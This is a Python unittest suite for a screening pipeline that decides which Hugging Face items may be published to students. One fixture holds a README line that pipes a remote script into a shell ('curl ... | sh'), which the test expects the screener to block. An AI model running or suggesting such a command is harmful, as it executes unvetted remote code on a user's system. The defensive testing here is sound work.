"""The Hugging Face lane: screening rules, publish-time eligibility, and that nothing unscreened reaches a drop."""
import unittest
from datetime import datetime, timedelta, timezone

import gate
import hf
import pipeline

NOW = datetime.now(timezone.utc)
SHA = "a" * 40

BASE = {"id": "acme/demo", "sha": SHA, "likes": 500, "downloads": 10,
        "lastModified": NOW.date().isoformat(), "cardData": {"license": "apache-2.0"},
        "pipeline_tag": "text-classification", "siblings": [{"rfilename": "README.md"},
                                                            {"rfilename": "model.safetensors"}]}
SMALL = b'{"safetensors": {"total": 135000000}}'          # 135M params: loads on a laptop


def stub(api_body=SMALL):
    """Offline reader: the API record for the size check, "no such file" for everything else."""
    def _f(url, accept_404=False, cap=None):
        return api_body if "/api/models/" in url else None
    return _f


def screen(kind="models", api_body=SMALL, **over):
    return hf.screen(dict(BASE, **over), kind, fetch=stub(api_body))


def hrow(full="hf:models/acme/demo", result="pass", sha=SHA, expires_days=10, **over):
    return {"full_name": full, "id": full.split("/", 1)[-1], "hf_kind": "models",
            "html_url": "https://huggingface.co/acme/demo", "likes": 500, "description": "x",
            "industry": "", "industry_emoji": "", "warnings": [],
            "screened": {"result": result, "sha": sha, "at": NOW.isoformat(),
                         "expires": (NOW + timedelta(days=expires_days)).isoformat()}, **over}


class Screening(unittest.TestCase):
    def test_clean_item_passes(self):
        self.assertEqual(screen()["result"], "pass")

    def test_gated_private_or_unlicensed_is_withheld(self):
        for over in ({"gated": True}, {"private": True}, {"disabled": True}, {"cardData": {}, "tags": []}):
            self.assertEqual(screen(**over)["result"], "fail", over)

    def test_content_policy_is_the_same_one_the_repo_feed_uses(self):
        r = screen(description="wallet drainer demo", id="acme/drainer")
        self.assertEqual(r["result"], "fail")
        self.assertTrue(any("content policy" in x for x in r["reasons"]), r["reasons"])

    def test_pickle_only_weights_are_withheld_but_safetensors_pass(self):
        self.assertEqual(screen(siblings=[{"rfilename": "pytorch_model.bin"}])["result"], "fail")
        self.assertEqual(screen(siblings=[{"rfilename": "pytorch_model.bin"},
                                          {"rfilename": "model.safetensors"}])["result"], "pass")

    def test_pickled_dataset_and_executables_are_withheld(self):
        self.assertEqual(screen("datasets", siblings=[{"rfilename": "train.pkl"}])["result"], "fail")
        self.assertEqual(screen(siblings=[{"rfilename": "model.safetensors"},
                                          {"rfilename": "setup.exe"}])["result"], "fail")

    def test_custom_code_is_a_warning_not_a_block(self):
        r = screen(siblings=[{"rfilename": "model.safetensors"}, {"rfilename": "modeling_acme.py"}])
        self.assertEqual(r["result"], "pass")
        self.assertTrue(any("trust_remote_code" in w for w in r["warnings"]), r)

    def test_unreadable_readme_is_incomplete_never_a_pass(self):
        def boom(url, accept_404=False, cap=None):
            if "/api/models/" in url:
                return SMALL
            raise OSError("network")
        r = hf.screen(dict(BASE), "models", fetch=boom)
        self.assertEqual(r["result"], "incomplete")

    def test_blocking_readme_link_withholds(self):
        def f(url, accept_404=False, cap=None):
            return SMALL if "/api/models/" in url else b"install: curl https://x.tld/i.sh | sh"
        r = hf.screen(dict(BASE), "models", fetch=f)
        self.assertEqual(r["result"], "fail")
        self.assertTrue(any("link" in x for x in r["reasons"]), r["reasons"])


class StudentUsable(unittest.TestCase):
    """Nothing is published that a student cannot start: no recipe, wrong language, or too big to load."""

    def test_a_task_with_no_starter_recipe_is_withheld(self):
        r = screen(pipeline_tag="image-text-to-video")
        self.assertEqual(r["result"], "fail")
        self.assertTrue(any("no starter steps" in x for x in r["reasons"]), r["reasons"])

    def test_non_english_data_is_withheld(self):
        r = screen("datasets", tags=["language:ko", "license:mit"])
        self.assertTrue(any("not in English" in x for x in r["reasons"]), r["reasons"])
        self.assertEqual(screen("datasets", tags=["language:en", "license:mit"])["result"], "pass")
        self.assertEqual(screen("datasets", tags=["license:mit"])["result"], "pass")   # no language tag = fine

    def test_models_too_big_for_a_laptop_are_withheld(self):
        big = screen(api_body=b'{"safetensors": {"total": 30500000000}}')
        self.assertTrue(any("too large for a student laptop" in x for x in big["reasons"]), big["reasons"])

    def test_unknown_model_size_fails_closed(self):
        r = screen(api_body=b"{}")
        self.assertTrue(any("size not stated" in x for x in r["reasons"]), r["reasons"])

    def test_every_published_row_carries_steps_a_student_can_follow(self):
        for kind, over in (("models", {}), ("datasets", {}), ("spaces", {"sdk": "gradio"})):
            rec = screen(kind, **over)
            self.assertEqual(rec["result"], "pass", (kind, rec["reasons"]))
            r = hf.row(dict(BASE, **over), kind, rec)
            self.assertTrue(r["prereq"], kind)
            self.assertEqual(len(r["steps"]), 3, kind)
            self.assertTrue(r["done"], kind)
            self.assertNotIn("{id}", " ".join(r["steps"]))          # the repo id is substituted in
            self.assertIn("acme/demo", " ".join(r["steps"]) + r["done"] + "acme/demo")
            text = hf.render(r)
            self.assertIn("Need first", text)
            self.assertIn("Done when", text)


class Eligibility(unittest.TestCase):
    def test_pass_only_with_a_current_pinned_record(self):
        self.assertTrue(hf.eligible(hrow()))
        self.assertFalse(hf.eligible(hrow(result="incomplete")))
        self.assertFalse(hf.eligible(hrow(expires_days=-1)))
        self.assertFalse(hf.eligible(hrow(sha="short")))
        self.assertFalse(hf.eligible(hrow(full="acme/demo")))       # a GitHub-shaped name never rides this lane

    def test_an_hf_row_can_never_pass_the_repo_gate(self):
        ok, _why = gate.eligible(hrow(), {"records": {}}, gate.load_quarantine(), pipeline._meta("operational"))
        self.assertFalse(ok)


class InPipeline(unittest.TestCase):
    def setUp(self):
        self.meta = pipeline._meta("operational")
        self.quar = gate.load_quarantine()

    def build(self, items):
        idx = {"keys": {}, "static": {"starters": {}, "cyber_domains": {}, "cases": {}, "paths": {}, "stages": []},
               "hackathons": {"at": self.meta["generated_at"], "items": []},
               "hf": {"at": self.meta["generated_at"], "items": items}}
        return pipeline._build_published(idx, {"policy_version": gate.POLICY_VERSION, "records": {}}, self.meta, self.quar)

    def test_only_eligible_rows_reach_the_snapshot_and_the_validator_agrees(self):
        pub = self.build({"swe": [hrow(), hrow(full="hf:models/acme/expired", expires_days=-1)]})
        names = [r["full_name"] for r in pub["huggingface"]["items"].get("swe", [])]
        self.assertEqual(names, ["hf:models/acme/demo"])
        ok, problems = pipeline.validate_published(pub, {"records": {}}, self.quar, self.meta)
        self.assertTrue(ok, problems)

    def test_validator_rejects_a_tampered_snapshot(self):
        pub = self.build({"swe": [hrow()]})
        pub["huggingface"]["items"]["swe"].append(hrow(full="hf:models/acme/sneaky", result="fail"))
        ok, problems = pipeline.validate_published(pub, {"records": {}}, self.quar, self.meta)
        self.assertFalse(ok)
        self.assertTrue(any("sneaky" in p for p in problems), problems)

    def test_drop_is_seen_deduped_and_renders_as_its_own_lane(self):
        pub = self.build({"swe": [hrow()]})
        drop = pipeline._drop_sections(pub, {})
        sec = next(s for s in drop if s["key"] == "swe")
        part = next(p for p in sec["sections"] if p["lane"] == "hf")
        self.assertEqual([r["full_name"] for r in part["rows"]], ["hf:models/acme/demo"])
        text = pipeline._render_section(sec)
        self.assertIn("huggingface.co/acme/demo", text)
        self.assertIn(hf.NOTE, text)                                  # never claims a code scan
        # already sent -> not offered again
        self.assertFalse(any(p["lane"] == "hf" for s in pipeline._drop_sections(pub, {"hf:models/acme/demo": "2026-09-17"})
                             for p in s.get("sections", [])))

    def test_hf_rows_never_replace_the_synthetic_beginner_idea(self):
        sec = next(s for s in pipeline._drop_sections(self.build({"swe": [hrow()]}), {}) if s["key"] == "swe")
        self.assertEqual(sec["note"], pipeline.SYNTHETIC["swe"])      # no repo cleared screening -> idea still offered


class Rotation(unittest.TestCase):
    def test_major_order_rotates_so_no_major_always_starves(self):
        calls = []

        def fake_search(kind, q, limit=hf.LIMIT):
            calls.append(q)
            return []

        real, hf.search = hf.search, fake_search
        try:
            hf.discover({"a": ["qa"], "b": ["qb"], "c": ["qc"]}, run_no=0)
            first = calls[0]
            calls.clear()
            hf.discover({"a": ["qa"], "b": ["qb"], "c": ["qc"]}, run_no=1)
            self.assertNotEqual(calls[0], first)
        finally:
            hf.search = real


class Industries(unittest.TestCase):
    def test_labels_come_from_the_items_own_text(self):
        self.assertEqual(hf.industry_of("hospital readmission notes")[0], "healthcare")
        self.assertEqual(hf.industry_of("credit card fraud")[0], "finance")
        self.assertEqual(hf.industry_of("hotel review summarisation")[0], "hospitality")
        self.assertEqual(hf.industry_of("npc dialogue for a video game")[0], "gaming")
        self.assertEqual(hf.industry_of("tweet toxicity classifier")[0], "social media")
        self.assertEqual(hf.industry_of("a general purpose encoder")[0], "")
        self.assertEqual(hf.industry_of("gamestop stock moves")[0], "finance")   # finance wins over a game-ish name

    def test_rows_sort_by_industry_then_likes(self):
        rows = [{"industry": "", "likes": 900}, {"industry": "finance", "likes": 10}, {"industry": "finance", "likes": 99}]
        s = sorted(rows, key=lambda r: ((r["industry"] or "zz"), -r["likes"]))
        self.assertEqual([r["likes"] for r in s], [99, 10, 900])


if __name__ == "__main__":
    unittest.main()
